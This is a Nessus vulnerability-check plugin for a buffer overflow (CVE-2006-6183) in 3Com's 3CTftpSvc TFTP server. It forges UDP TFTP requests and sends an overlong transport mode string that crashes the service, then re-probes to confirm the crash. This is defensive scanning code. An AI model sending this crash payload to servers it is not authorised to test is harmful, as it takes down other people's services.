#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(23735);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2006-6183");
  script_bugtraq_id(21301, 21322);
  script_xref(name:"OSVDB", value:"30758");

  script_name(english:"3CTftpSvc Long Transport Mode Remote Overflow");
  script_summary(english:"Checks for a buffer overflow vulnerability in 3Com 3CTftpSvc");

 script_set_attribute(attribute:"synopsis", value:
"The remote tftp server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running 3CTftpSvc, a tftpd server for
Windows. 

The version of Tftpd32 installed on the remote host appears to be
affected by a buffer overflow vulnerability involving a long transport
mode when getting or putting files.  By leveraging this flaw, a remote
attacker may be able to crash the remote service or to execute code on
the affected host subject to the privileges under which the service
operates, by default LOCAL SYSTEM." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/452754/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("tftpd_detect.nasl");
  script_require_keys("Services/udp/tftp");
  exit(0);
}


include("misc_func.inc");
include("global_settings.inc");


if (report_paranoia < 2) exit(0);


port = get_kb_item("Services/udp/tftp");
if (!port) port = 69;


function tftp_get(port, file, mode) {
  local_var data, filter, i, ip, req, res, sport, udp;

  if (isnull(port)) port = 69;
  if (isnull(mode)) mode = "netascii";
  if (isnull(file)) return NULL;

  req = raw_string(
    0x00, 0x01,                        # Get
    file, 0x00,                        # file
    mode, 0x00                         # as per specified mode
  );

  ip = forge_ip_packet(
    ip_hl:5, 
    ip_v:4, 
    ip_tos:0, 
    ip_len:20, 
    ip_id:rand(), 
    ip_off:0, 
    ip_ttl:64, 
    ip_p:IPPROTO_UDP,
    ip_src:this_host()
  );
  sport = rand() % 64512 + 1024;		     
  udp = forge_udp_packet(
    ip:ip, 
    uh_sport:sport, 
    uh_dport:port, 
    uh_ulen:8 + strlen(req), 
    data:req
  );

  filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';
  res = send_packet(
    udp, 
    pcap_active:TRUE, 
    pcap_filter:filter, 
    pcap_timeout:1
  );

  # If there's a result, return the data.
  if (res) {
    return get_udp_element(udp:res, element:"data");
  }
}


# If the server is up...
file = string(SCRIPT_NAME, "-", unixtime());
res = tftp_get(port:port, file:file);
if (!isnull(res)) {
  # Send the exploit.
  res = tftp_get(port:port, file:"A", mode:string("netascii", crap(469)));

  # Test the server again.
  res = tftp_get(port:port, file:file);

  # There's a problem if we didn't get anything back.
  if (isnull(res)) security_hole(port:port, protocol:"udp");
}
